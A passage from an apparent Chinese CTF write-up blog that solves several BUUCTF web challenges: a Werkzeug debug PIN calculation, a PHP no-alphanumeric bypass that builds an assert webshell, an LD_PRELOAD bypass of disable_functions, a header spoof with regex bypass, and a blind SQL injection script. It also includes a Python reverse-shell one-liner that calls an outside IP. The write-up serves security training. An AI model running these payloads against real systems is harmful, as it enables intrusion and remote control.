class="line">cookie_name &#x3D; &#39;__wzd&#39; + h.hexdigest()[:20]</span><br><span class="line">num &#x3D; None</span><br><span class="line">if num is None:</span><br><span class="line">    h.update(b&#39;pinsalt&#39;)</span><br><span class="line">    num &#x3D; (&#39;%09d&#39; % int(h.hexdigest(), 16))[:9]</span><br><span class="line">rv &#x3D; None</span><br><span class="line">if rv is None:</span><br><span class="line">    for group_size in 5, 4, 3:</span><br><span class="line">        if len(num) % group_size &#x3D;&#x3D; 0:</span><br><span class="line">            rv &#x3D; &#39;-&#39;.join(num[x:x + group_size].rjust(group_size, &#39;0&#39;)</span><br><span class="line">                          for x in range(0, len(num), group_size))</span><br><span class="line">            break</span><br><span class="line">    else:</span><br><span class="line">        rv &#x3D; num</span><br><span class="line">print(rv)</span><br><span class="line"></span><br><span class="line">230-866-188</span><br></pre></td></tr></table></figure>



<p>将得到的PIN码输入即可得到shell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">无法直接获取到程序回显，使用 os.popen(&quot;exp&quot;).read() 代替 os.system(&quot;exp&quot;) </span><br><span class="line"></span><br><span class="line">import os</span><br><span class="line">os.popen(&quot;ls -l &#x2F;&quot;).read()</span><br><span class="line">os.popen(&quot;cat &#x2F;this_is_the_flag.txt&quot;).read()</span><br></pre></td></tr></table></figure>



<h3 id="TIPS"><a href="#TIPS" class="headerlink" title="TIPS"></a>TIPS</h3><p>Flask开启debug模式等于给黑客留了后门</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">app.run(host&#x3D;&quot;0.0.0.0&quot;, port&#x3D;80, debug&#x3D;True)</span><br><span class="line">这样就可以开启debug模式</span><br></pre></td></tr></table></figure>

<p>报错开启，会泄露源码和路径</p>


<p>并且存在一个PIN的命令窗口</p>
<p>这里附加一个反弹命令的指令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;19x.13.xx.254&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);</span><br><span class="line">参考</span><br><span class="line">https:&#x2F;&#x2F;zhuanlan.zhihu.com&#x2F;p&#x2F;32138231</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">启用了debug功能（debug设为True），这意味着只要Python文件发生改动，服务器就会重启。</span><br></pre></td></tr></table></figure>

<h2 id="极客大挑战-2019-RCE-ME"><a href="#极客大挑战-2019-RCE-ME" class="headerlink" title="[极客大挑战 2019]RCE ME"></a>[极客大挑战 2019]RCE ME</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#39;code&#39;]))&#123;</span><br><span class="line">            $code&#x3D;$_GET[&#39;code&#39;];</span><br><span class="line">                    if(strlen($code)&gt;40)&#123;</span><br><span class="line">                                        die(&quot;This is too Long.&quot;);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    if(preg_match(&quot;&#x2F;[A-Za-z0-9]+&#x2F;&quot;,$code))&#123;</span><br><span class="line">                                        die(&quot;NO.&quot;);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    @eval($code);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">            highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; ?&gt;</span><br></pre></td></tr></table></figure>

<p>发现不能出现字符或者数字</p>
<p>尝试取反绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?code&#x3D;(~%8F%97%8F%96%91%99%90)();</span><br><span class="line">phpinfo</span><br></pre></td></tr></table></figure>

<p>发现可以绕过，查看phpinfo（）发现很多禁用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,dl</span><br></pre></td></tr></table></figure>

<p>然后我想直接上传一个一句话木马但发现不能成功<code>异或拼接</code>的方法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">当&#96;5&lt;&#x3D;PHP&lt;&#x3D;7.0.9&#96;时，需要再执行一次构造出来的字符，所以参考上面那种</span><br><span class="line"></span><br><span class="line">$_&#x3D;(~&#39;%9E%8C%8C%9A%8D%8B&#39;);$__&#x3D;&#39;_&#39;.(~&#39;%AF%B0%AC%AB&#39;);$___&#x3D;$$__;$_($___[_]);</span><br><span class="line">#assert($_POST[_]);</span><br><span class="line">或者</span><br><span class="line">在这里，我们不能直接使用eval 因为 eval并不是php函数 所以为我们无法通过变量函数的方法进行调用。</span><br><span class="line">在这里，我们使用 assert 来构造，但由于php版本问题，我们并不能直接构造&lt;?php assert($_POST[&#39;a&#39;]);&gt;,我们需要调用eval</span><br><span class="line">拼接为 assert（eval($_POST[test])）</span><br></pre></td></tr></table></figure>



<p>成功，蚁剑链接</p>
<p>连接的时候遇到无法连接问题，可能是因为我们的参数只有下划线，甚至没有引号识别不了，重新传入一个aaa参数连接成功</p>


<p>但进去之后发现flag读取不了,因为存在disable_function</p>
<p>方法一直接利用蚁剑的插件跳过</p>


<p>方法二：</p>
<p>hack.c</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">void payload() &#123;</span><br><span class="line">	system(&quot;cat &#x2F;flag &gt;&gt; &#x2F;var&#x2F;tmp&#x2F;test.php&quot;);</span><br><span class="line">	system(&quot;tac &#x2F;flag &gt;&gt; &#x2F;var&#x2F;tmp&#x2F;test.php&quot;);</span><br><span class="line">	system(&quot;more &#x2F;flag &gt;&gt; &#x2F;var&#x2F;tmp&#x2F;test.php&quot;);</span><br><span class="line">	system(&quot;head -2 &#x2F;flag &gt;&gt; &#x2F;var&#x2F;tmp&#x2F;test.php&quot;);</span><br><span class="line">	system(&quot;tail &#x2F;flag &gt;&gt; &#x2F;var&#x2F;tmp&#x2F;test.php&quot;);</span><br><span class="line">	system(&quot;&#x2F;readflag &gt;&gt; &#x2F;var&#x2F;tmp&#x2F;test.php&quot;);</span><br><span class="line">	</span><br><span class="line">&#125;   </span><br><span class="line">int  geteuid() &#123;</span><br><span class="line">    if (getenv(&quot;LD_PRELOAD&quot;) &#x3D;&#x3D; NULL) &#123; return 0; &#125;</span><br><span class="line">    unsetenv(&quot;LD_PRELOAD&quot;);</span><br><span class="line">    payload();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">getenv：获取环境变量的值</span><br><span class="line"></span><br><span class="line">unsetenv：用来删除一个环境变量</span><br><span class="line"></span><br><span class="line">system：定的命令名称或程序名称传给要被命令处理器执行的主机环境</span><br><span class="line"></span><br><span class="line">payload 函数大概是说 查询 flag 并将flag返回到&#x2F;var&#x2F;tmp&#x2F;文件夹下，flag返回形式为 test.php。</span><br><span class="line">使用linux将我们的 .c 变为 so</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -fPIC hack.c -o getflag.so</span><br></pre></td></tr></table></figure>

<p>php.shell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">s&lt;?php</span><br><span class="line">putenv(&quot;LD_PRELOAD&#x3D;&#x2F;var&#x2F;tmp&#x2F;getflag.so&quot;);</span><br><span class="line">mail(&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;);</span><br><span class="line">error_log(&quot;&quot;,1,&quot;&quot;,&quot;&quot;);</span><br><span class="line">?&gt;</span><br><span class="line">LD_PRELOAD&#x3D;&#x2F;var&#x2F;tmp&#x2F;getflag.so 意思是 LD_PRELOAD 是&#x2F;var&#x2F;tmp&#x2F;文件夹下的 getflag.so 文件.</span><br><span class="line"></span><br><span class="line">上传我们的 getflag.so 文件和 shell.php 文件</span><br></pre></td></tr></table></figure>

<p>然后访问我们php文件即可（异或）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code&#x3D;$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&amp;_&#x3D;assert&amp;__&#x3D;include(%27&#x2F;var&#x2F;tmp&#x2F;shell.php%27)&amp;cmd&#x3D;&#x2F;readflag&amp;outpath&#x3D;&#x2F;tmp&#x2F;tmpfile&amp;sopath&#x3D;&#x2F;var&#x2F;tmp&#x2F;getflag.so</span><br></pre></td></tr></table></figure>



<h3 id="TIPS-1"><a href="#TIPS-1" class="headerlink" title="TIPS"></a>TIPS</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">assert 可以将整个字符串参数当作php参数执行，但在 php7版本中</span><br><span class="line">assert ( mixed $assertion [, Throwable $exception ] ) : bool</span><br></pre></td></tr></table></figure>

<h2 id="MRCTF2020-套娃"><a href="#MRCTF2020-套娃" class="headerlink" title="[MRCTF2020]套娃"></a>[MRCTF2020]套娃</h2><p>F12大法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">那在这里就可以使用%20代替下划线绕过第一个判断。第二个判断中正则匹配表示匹配字符串的开头和结尾，在字符串中换行可以表示字符串的结尾，所以可以用%0a（换行符的url编码）绕过。&lt;?php</span><br><span class="line">$query &#x3D; $_SERVER[&#39;QUERY_STRING&#39;];</span><br><span class="line"></span><br><span class="line"> if( substr_count($query, &#39;_&#39;) !&#x3D;&#x3D; 0 || substr_count($query, &#39;%5f&#39;) !&#x3D; 0 )&#123;&#x2F;&#x2F;即不能存在_，这里用%5f url编码绕过也被过滤了，但是可以使用空格代替_来进行绕过</span><br><span class="line">    die(&#39;Y0u are So cutE!&#39;);</span><br><span class="line">&#125;</span><br><span class="line"> if($_GET[&#39;b_u_p_t&#39;] !&#x3D;&#x3D; &#39;23333&#39; &amp;&amp; preg_match(&#39;&#x2F;^23333$&#x2F;&#39;, $_GET[&#39;b_u_p_t&#39;]))&#123;&#x2F;&#x2F;%0A是回车的url编码，可以满足不强等于，同时满足含有特定字符串</span><br><span class="line">    echo &quot;you are going to the next ~&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">那在这里就可以使用%20代替下划线绕过第一个判断。第二个判断中正则匹配表示匹配字符串的开头和结尾，在字符串中换行可以表示字符串的结尾，所以可以用%0a（换行符的url编码）绕过。</span><br></pre></td></tr></table></figure>

<p>构造</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?b u p t&#x3D;23333%0a</span><br></pre></td></tr></table></figure>

<p>进入下一关提示FLAG in secrettw.php</p>


<p>F12大法再显神通</p>


<p>看到这种内容进制丢近控制台运行得到信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">post me Merak</span><br></pre></td></tr></table></figure>

<p>利用POST方法传入参数Merak内容随意得到一段源码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">error_reporting(0); </span><br><span class="line">include &#39;takeip.php&#39;;</span><br><span class="line">ini_set(&#39;open_basedir&#39;,&#39;.&#39;); </span><br><span class="line">include &#39;flag.php&#39;;</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&#39;Merak&#39;]))&#123; </span><br><span class="line">    highlight_file(__FILE__); </span><br><span class="line">    die(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function change($v)&#123; </span><br><span class="line">    $v &#x3D; base64_decode($v); </span><br><span class="line">    $re &#x3D; &#39;&#39;; </span><br><span class="line">    for($i&#x3D;0;$i&lt;strlen($v);$i++)&#123; </span><br><span class="line">        $re .&#x3D; chr ( ord ($v[$i]) + $i*2 ); </span><br><span class="line">    &#125; </span><br><span class="line">    return $re; </span><br><span class="line">&#125;</span><br><span class="line">echo &#39;Local access only!&#39;.&quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">$ip &#x3D; getIp();</span><br><span class="line">if($ip!&#x3D;&#39;127.0.0.1&#39;)</span><br><span class="line">echo &quot;Sorry,you don&#39;t have permission!  Your ip is :&quot;.$ip;</span><br><span class="line">if($ip &#x3D;&#x3D;&#x3D; &#39;127.0.0.1&#39; &amp;&amp; file_get_contents($_GET[&#39;2333&#39;]) &#x3D;&#x3D;&#x3D; &#39;todat is a happy day&#39; )&#123;</span><br><span class="line">echo &quot;Your REQUEST is:&quot;.change($_GET[&#39;file&#39;]);</span><br><span class="line">echo file_get_contents(change($_GET[&#39;file&#39;])); &#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>

<p>需要满足的条件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if($ip &#x3D;&#x3D;&#x3D; &#39;127.0.0.1&#39; &amp;&amp; file_get_contents($_GET[&#39;2333&#39;]) &#x3D;&#x3D;&#x3D; &#39;todat is a happy day&#39; )</span><br></pre></td></tr></table></figure>

<p>这个ip的话我们需要通过一个参数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Client-ip:127.0.0.1</span><br><span class="line">添加上述报文</span><br><span class="line">2333的内容可以通过协议添加</span><br><span class="line">data:text&#x2F;plain,todat is a happy day</span><br><span class="line">然后是file内容的解密</span><br></pre></td></tr></table></figure>

<p>其中加密那段进行逆向得到</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">  $v  &#x3D;  &#39;flag.php&#39;;  </span><br><span class="line">  $re  &#x3D;  &#39;&#39;;  </span><br><span class="line">  for($i&#x3D;0;$i&lt;strlen($v);$i++)&#123;  </span><br><span class="line">    $re  .&#x3D;  chr  (  ord  ($v[$i])  -  $i*2  );  </span><br><span class="line">  &#125;  </span><br><span class="line">  echo  base64_encode($re);  </span><br><span class="line">?&gt;   </span><br><span class="line">ZmpdYSZmXGI&#x3D;</span><br></pre></td></tr></table></figure>



<h2 id="WUSTCTF2020-颜值成绩查询"><a href="#WUSTCTF2020-颜值成绩查询" class="headerlink" title="[WUSTCTF2020]颜值成绩查询"></a>[WUSTCTF2020]颜值成绩查询</h2><p>尝试了一下，一眼布尔注入</p>
<p>直接改下脚本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;4b12b4e6-1d9e-413a-9ab2-cd9f721dbcc9.node4.buuoj.cn:81&#x2F;&quot;</span><br><span class="line"></span><br><span class="line"># 0^(ord(substr(database(),1,1))&gt;32)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def getDatabase():</span><br><span class="line">    database_name &#x3D; &quot;&quot;</span><br><span class="line">    for x in range(1, 1000):</span><br><span class="line">        low &#x3D; 32</span><br><span class="line">        hight &#x3D; 127</span><br><span class="line">        mid &#x3D; (low+hight)&#x2F;&#x2F;2</span><br><span class="line">        while low &lt; hight:</span><br><span class="line">            params &#x3D; &#123;</span><br><span class="line">                &quot;stunum&quot;: &quot;0^(ord(substr((select(database())),&quot;+str(x)+&quot;,1))&gt;&quot;+str(mid)+&quot;)&quot;</span><br><span class="line">            &#125;</span><br><span class="line">            r &#x3D; requests.get(url&#x3D;url, params&#x3D;params)</span><br><span class="line">            if &quot;your score is: 100&quot; in r.text:</span><br><span class="line">                low &#x3D; mid+1</span><br><span class="line">            else:</span><br><span class="line">                hight &#x3D; mid</span><br><span class="line">            mid &#x3D; (low+hight)&#x2F;&#x2F;2</span><br><span class="line">        if low &lt;&#x3D; 32 or hight &gt;&#x3D; 127:</span><br><span class="line">            break</span><br><span class="line">        database_name +&#x3D; chr(mid)</span><br><span class="line">        print(&quot;数据库为：&quot;, database_name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def getTable():  # 获取表名</span><br><span class="line">    tables_name &#x3D; &quot;&quot;</span><br><span class="line">    for x in range(1, 1000):</span><br><span class="line">        left &#x3D; 32</span><br><span class="line">        right &#x3D; 127</span><br><span class="line">        mid &#x3D; (left+right)&#x2F;&#x2F;2</span><br><span class="line">        while left &lt; right:</span><br><span class="line">            params &#x3D; &#123;</span><br><span class="line">                &quot;stunum&quot;: &quot;0^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema&#x3D;database())),&quot;+str(x)+&quot;,1))&gt;&quot;+str(mid)+&quot;)&quot;</span><br><span class="line">            &#125;</span><br><span class="line">            r &#x3D; requests.get(url&#x3D;url, params&#x3D;params)</span><br><span class="line">            if &quot;your score is: 100&quot; in r.text:</span><br><span class="line">                left &#x3D; mid + 1</span><br><span class="line">            else:</span><br><span class="line">                right &#x3D; mid</span><br><span class="line">            mid &#x3D; (left + right) &#x2F;&#x2F; 2</span><br><span class="line">        if left &lt; 32 or right &gt; 127:</span><br><span class="line">            break</span><br><span class="line">        tables_name +&#x3D; chr(mid)</span><br><span class="line">        print(&quot;table:&quot;, tables_name)</span><br><span class="line">        time.sleep(1)</span><br><span class="line">#  F1naI1y,Flaaaaag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def getColmun():</span><br><span class="line">    column_name &#x3D; &quot;&quot;</span><br><span class="line">    for x in range(1, 1000):</span><br><span class="line">        left &#x3D; 32</span><br><span class="line">        right &#x3D; 127</span><br><span class="line">        mid &#x3D; (left+right)&#x2F;&#x2F;2</span><br><span class="line">        while left &lt; right:</span><br><span class="line">            while left &lt; right:</span><br><span class="line">                params &#x3D; &#123;</span><br><span class="line">                    &quot;stunum&quot;: &quot;0^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name&#x3D;&#39;flag&#39;)),&quot; + str(x) + &quot;,1))&gt;&quot; + str(mid) + &quot;)&quot;</span><br><span class="line">                &#125;</span><br><span class="line">                r &#x3D; requests.get(url&#x3D;url, params&#x3D;params)</span><br><span class="line">                if &quot;your score is: 100&quot; in r.text:</span><br><span class="line">                    left &#x3D; mid + 1</span><br><span class="line">                else:</span><br><span class="line">                    right &#x3D; mid</span><br><span class="line">                mid &#x3D; (left + right) &#x2F;&#x2F; 2</span><br><span class="line">            if left &lt; 32 or right &gt; 127:</span><br><span class="line">                break</span><br><span class="line">            column_name +&#x3D; chr(mid)</span><br><span class="line">            print(&quot;column:&quot;,  column_name)</span><br><span class="line">            time.sleep(1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def getFlag():</span><br><span class="line">    flag &#x3D; &quot;&quot;</span><br><span class="line">    for x in range(1, 1000):</span><br><span class="line">        left &#x3D; 32</span><br><span class="line">        right &#x3D; 127</span><br><span class="line">        mid &#x3D; (left+right)&#x2F;&#x2F;2</span><br><span class="line">        while left &lt; right:</span><br><span class="line">            while left &lt; right:</span><br><span class="line">                params &#x3D; &#123;</span><br><span class="line">                    &quot;stunum&quot;: &quot;0^(ord(substr((select(group_concat(value))from(flag)),&quot; + str(x) + &quot;,1))&gt;&quot; + str(mid) + &quot;)&quot;</span><br><span class="line">                &#125;</span><br><span class="line">                r &#x3D; requests.get(url&#x3D;url, params&#x3D;params)</span><br><span class="line">                if &quot;your score is: 100&quot; in r.text:</span><br><span class="line">                    left &#x3D; mid + 1</span><br><span class="line">                else:</span><br><span class="line">                    right &#x3D; mid</span><br><span class="line">                mid &#x3D; (left + right) &#x2F;&#x2F; 2</span><br><span class="line">            if left &lt; 32 or right &gt; 127:</span><br><span class="line">                break</span><br><span class="line">            flag +&#x3D; chr(mid)</span><br><span class="line">            print(&quot;flag:&quot;,  flag)</span><br><span class="line">            time.sleep(1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># getDatabase()</span><br><span class="line"># getTable()</span><br><span class="line"># getColmun()</span><br><span class="line">getFlag()</span><br><span class="line"></span><br><span class="line"># flag&#123;3cbd3b28-836a-4f7d-86ec-562db447f09a&#125;</span><br></pre></td></tr></table></figure>

<h2 id="FBCTF2019-RCEService"><a href="#FBCTF2019-RCEService" class="headerlink" title="[FBCTF2019]RCEService"></a>[FBCTF2019]RCEService</h2><p>提示利用json传入内容，直接输入命令会出现报错，并且存在某些过滤</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">json数组形式</span><br><span class="line">cmd&#x3D;&#123;&quot;cmd&quot;:&quot;ls&quot;&#125;</span><br></pre></td></tr></table></figure>



<p>但没有源码，无从下手，网上找到源码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">putenv(&#39;PATH&#x3D;&#x2F;home&#x2F;rceservice&#x2F;jail&#39;);</span><br><span class="line"></span><br><span class="line">if (isset($_REQUEST[&#39;cmd&#39;])) &#123;</span><br><span class="line">    $json &#x3D; $_REQUEST[&#39;cmd&#39;];</span><br><span class="line"></span><br><span class="line">    if (!is_string($json)) &#123;</span><br><span class="line">        echo &#39;Hacking attempt detected&lt;br&#x2F;&gt;&lt;br&#x2F;&gt;&#39;;</span><br><span class="line">    &#125; elseif (preg_match(&#39;&#x2F;^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\&#x2F;;-@\[-&#96;|~\x7F]+).*$&#x2F;&#39;, $json)) &#123;</span><br><span class="line">        echo &#39;Hacking attempt detected&lt;br&#x2F;&gt;&lt;br&#x2F;&gt;&#39;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &#39;Attempting to run command:&lt;br&#x2F;&gt;&#39;;</span><br><span class="line">        $cmd &#x3D; json_decode($json, true)[&#39;cmd&#39;];</span><br><span class="line">        if ($cmd !&#x3D;&#x3D; NULL) &#123;</span><br><span class="line">            system($cmd);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            echo &#39;Invalid input&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">        echo &#39;&lt;br&#x2F;&gt;&lt;br&#x2F;&gt;&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>需要传入json类型，并且key为cmd，value通过过滤后会执行system(value)</p>
<p>那么本次的难题就是如何绕过preg_match</p>
<h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>利用%0a</p>
